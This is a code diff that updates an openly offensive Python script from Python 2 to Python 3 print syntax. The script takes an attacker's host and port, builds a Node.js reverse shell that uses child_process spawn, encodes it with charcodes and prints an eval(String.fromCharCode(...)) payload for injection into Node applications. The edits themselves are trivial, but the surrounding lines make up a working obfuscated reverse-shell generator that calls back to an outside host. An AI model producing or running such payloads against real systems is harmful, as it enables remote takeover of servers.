@@ -4,10 +4,11 @@
 # https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
 # Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)
 # Insecurety Research (2013) - insecurety.net
+# Rapid fix update to python 3.10
 import sys
 
 if len(sys.argv) != 3:
-    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
+    print("Usage: %s <LHOST> <LPORT>" % (sys.argv[0]))
     sys.exit(0)
 
 IP_ADDR = sys.argv[1]
@@ -21,8 +22,8 @@ def charencode(string):
         encoded = encoded + "," + str(ord(char))
     return encoded[1:]
 
-print "[+] LHOST = %s" % (IP_ADDR)
-print "[+] LPORT = %s" % (PORT)
+print("[+] LHOST = %s" % (IP_ADDR))
+print("[+] LPORT = %s" % (PORT))
 NODEJS_REV_SHELL = '''
 var net = require('net');
 var spawn = require('child_process').spawn;
@@ -48,6 +49,6 @@ function c(HOST,PORT) {
 }
 c(HOST,PORT);
 ''' % (IP_ADDR, PORT)
-print "[+] Encoding"
+print("[+] Encoding")
 PAYLOAD = charencode(NODEJS_REV_SHELL)
-print "eval(String.fromCharCode(%s))" % (PAYLOAD)
+print("eval(String.fromCharCode(%s))" % (PAYLOAD))
